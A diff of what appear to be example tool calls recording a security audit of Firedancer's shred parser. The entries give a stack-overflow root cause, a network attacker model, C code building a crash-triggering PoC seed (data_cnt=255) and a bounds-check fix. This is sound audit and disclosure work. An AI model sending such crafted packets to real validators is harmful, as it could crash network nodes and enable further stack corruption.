@@ -85,7 +85,7 @@ without bounding the index against the declared allocation size.
   "tool": "capture_research_finding",
   "params": {
     "content": "In fd_shred_parse.c, function fd_shred_merkle_parse() at approx line 387, the loop\n`for( ulong i=0; i<hdr->data_cnt; i++ ) merkle[i] = ...`\ncopies the Merkle proof hashes from the wire packet into a stack buffer declared as\n`uchar merkle[FD_SHRED_MERKLE_PROOF_DEPTH_MAX][FD_SHRED_MERKLE_NODE_SZ]`.\nFD_SHRED_MERKLE_PROOF_DEPTH_MAX is 20. The peer-controlled field `hdr->data_cnt` is a\nuint16_t, so values 21..65535 will write past the end of the stack buffer.\nNo bounds check on `hdr->data_cnt` precedes the loop.",
-    "type": "research_note",
+    "artifactType": "research_note",
     "title": "fd_shred_merkle_parse: missing bounds check on hdr->data_cnt (OOB stack write)",
     "status": "draft",
     "sensitivity": "confidential",
@@ -125,7 +125,7 @@ of the call to `fd_shred_merkle_parse`.
   "tool": "capture_research_finding",
   "params": {
     "content": "Traced all callers of fd_shred_merkle_parse() in fd_shred.c. The call sites are:\n  1. fd_shred_parse_data() at fd_shred.c:621\n  2. fd_shred_parse_code() at fd_shred.c:694\nIn both callers, `hdr` is a direct cast of the incoming UDP payload:\n  `fd_shred_t const * hdr = (fd_shred_t const *)buf;`\nNo validation of `hdr->data_cnt` vs FD_SHRED_MERKLE_PROOF_DEPTH_MAX occurs in either\ncaller or in any function on the call stack between packet receipt and the parse.\nThe field is fully attacker-controlled over the network.",
-    "type": "research_note",
+    "artifactType": "research_note",
     "title": "fd_shred_merkle_parse callers pass raw peer data without sanitising data_cnt",
     "status": "draft",
     "sensitivity": "confidential",
@@ -163,7 +163,7 @@ hypothesis and links it to its two source observations via `derivedFrom`.
   "tool": "capture_research_finding",
   "params": {
     "content": "VULNERABILITY HYPOTHESIS\n\nTitle: OOB stack write in fd_shred_merkle_parse via peer-controlled data_cnt\n\nRoot cause:\n  fd_shred_merkle_parse() iterates `hdr->data_cnt` times writing 32-byte Merkle\n  nodes into a stack buffer of fixed depth FD_SHRED_MERKLE_PROOF_DEPTH_MAX (20).\n  Because `hdr->data_cnt` is a uint16_t read directly from a peer-supplied UDP\n  datagram with no prior bounds check, an attacker can supply data_cnt=255 and\n  cause 235 * 32 = 7520 bytes of controlled stack overwrite.\n\nAttacker model:\n  Any peer on the Turbine gossip network that can send a crafted shred packet\n  to a Firedancer validator's shred-receive port. No authentication required;\n  Turbine shreds are unauthenticated at the network layer before parsing.\n\nImpact (preconditions met):\n  Stack corruption in the shred receive thread. Depending on ASLR / stack-canary\n  configuration of the production build this may be:\n    - Validator crash / process death (DoS, loss of stake rewards) — HIGH\n    - Stack-canary bypass + RIP control if canaries are absent / weak — CRITICAL\n  Conservative severity: HIGH (crash). Escalation path to CRITICAL present.\n\nAffected harness: shred_parse (contest scope confirmed).\nAffected file: fd_shred_parse.c:387\nContest commit: 2f4625e3",
-    "type": "vulnerability_finding",
+    "artifactType": "vulnerability_finding",
     "title": "[HIGH/CRITICAL] OOB stack write in fd_shred_merkle_parse via peer-controlled data_cnt",
     "status": "draft",
     "sensitivity": "confidential",
@@ -336,7 +336,7 @@ vulnerable path through the `shred_parse` contest harness.
   "tool": "capture_research_finding",
   "params": {
     "content": "/* PoC harness — fd_shred_merkle_parse OOB stack write\n * Contest harness: shred_parse\n * Build: make -C src/disco/shred run_shred_parse_fuzzer\n *\n * Craft a data shred with data_cnt = 0x00FF (255).\n * Fields that must be valid to reach fd_shred_merkle_parse:\n *   - variant byte: FD_SHRED_TYPE_MERKLE_DATA (0xA0)\n *   - sz: sizeof(fd_shred_t) + 255 * FD_SHRED_MERKLE_NODE_SZ (255*32 = 8160 bytes)\n *   - The first sizeof(fd_shred_t) bytes = valid shred header; data_cnt = 0x00FF\n *   - Remaining 8160 bytes = 0x41 (filler), filling the Merkle proof slots\n *\n * Expected outcome (ASAN build):\n *   ==ERROR: AddressSanitizer: stack-buffer-overflow\n *   WRITE of size 32 at 0x... T0 pc 0x... bp 0x... sp 0x...\n *   #0 fd_shred_merkle_parse  fd_shred_parse.c:387\n *   #1 fd_shred_parse_data    fd_shred.c:621\n *\n * Seed file layout (hex):\n *   [shred header 88 bytes, data_cnt=0x00FF at offset 6]\n *   [8160 bytes of 0x41]\n */\n\n#include <stdint.h>\n#include <string.h>\n\nvoid build_poc_seed( uint8_t * buf, size_t * out_len ) {\n  memset( buf, 0, 88 + 8160 );\n  buf[0]  = 0xA0;          /* variant: MERKLE_DATA        */\n  buf[4]  = 0x00;          /* slot lo                     */\n  buf[5]  = 0x00;          /* slot hi                     */\n  buf[6]  = 0xFF;          /* data_cnt lo — 255           */\n  buf[7]  = 0x00;          /* data_cnt hi                 */\n  /* pad rest of header to 88 bytes, leave as zero         */\n  memset( buf + 88, 0x41, 8160 ); /* Merkle node filler   */\n  *out_len = 88 + 8160;\n}",
-    "type": "code_analysis",
+    "artifactType": "code_analysis",
     "title": "PoC seed: fd_shred_merkle_parse OOB write — data_cnt=255 triggers stack overflow",
     "status": "draft",
     "sensitivity": "confidential",
@@ -382,7 +382,7 @@ it without needing to regenerate it later.
   "tool": "capture_research_finding",
   "params": {
     "content": "FIX RECOMMENDATION\n\nAdd a bounds check on `hdr->data_cnt` before the Merkle-copy loop in\nfd_shred_merkle_parse(). Minimal patch:\n\n  // Before the loop at fd_shred_parse.c:385\n  if( FD_UNLIKELY( hdr->data_cnt > FD_SHRED_MERKLE_PROOF_DEPTH_MAX ) )\n    return FD_SHRED_PARSE_ERR_DATA_CNT;\n\nAlternatively, clamp and treat excess depth as a parse error:\n  ulong depth = fd_ulong_min( hdr->data_cnt, FD_SHRED_MERKLE_PROOF_DEPTH_MAX );\n  for( ulong i=0; i<depth; i++ ) merkle[i] = ...;\n  if( hdr->data_cnt != depth ) return FD_SHRED_PARSE_ERR_DATA_CNT;\n\nThe early-return approach is preferred: a shred with more Merkle nodes than the\nmaximum depth is definitionally malformed and should not be accepted.\n\nNote: the fix should be applied to fd_shred_merkle_parse() regardless of call\nsite — callers should not be expected to pre-validate internal size fields.",
-    "type": "audit_note",
+    "artifactType": "audit_note",
     "title": "Fix: add data_cnt bounds check in fd_shred_merkle_parse before Merkle copy loop",
     "status": "draft",
     "sensitivity": "confidential",
